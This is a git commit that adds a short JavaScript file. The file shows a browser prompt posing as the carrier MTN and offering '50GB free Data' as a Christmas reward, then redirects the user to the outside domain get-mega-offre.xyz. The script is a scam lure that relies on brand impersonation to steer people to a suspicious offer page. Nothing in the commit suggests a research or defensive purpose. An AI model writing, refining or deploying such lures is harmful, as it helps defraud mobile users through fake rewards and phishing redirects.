4f432263faa50c1d3e913c26af37c2c33fa3a481
bigetijazz9 <bigetijazz9@gmail.com>
2024-11-24 21:14:36 -0800

    Create christmas-sms.js

---
+++ christmas-sms.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 50GB'
+password=prompt('MTN: Congratulations, Your mobile Number is Eligible to receive 50GB free Data MTN Christmas REWARD, kindly press Ok to proceed now','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://www.get-mega-offre.xyz/christmas50gb';
+}
